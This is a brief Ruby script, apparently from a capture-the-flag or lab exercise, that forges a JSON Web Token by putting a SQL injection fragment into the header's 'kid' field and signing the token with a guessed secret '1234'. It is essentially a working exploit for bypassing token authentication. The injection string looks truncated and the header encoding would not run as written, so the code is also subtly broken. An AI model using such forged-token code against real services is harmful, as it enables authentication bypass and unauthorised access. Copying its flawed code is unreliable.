


header = {"typ":"JWT","alg":"HS256","kid": "NION SELECT '1 "}
payload =' {"user":null}'

require 'base64'
require 'openssl'

data = Base64.strict_encode64(header)+"."+Base64.strict_encode64(payload)
data=data.gsub!("=","")

puts data

secret =  "1234"
sig =Base64.urlsafe_encode64(OpenSSL::HMAC.digest(OpenSSL::Digest.new("sha256"),secret,data))

puts data+"."+sig



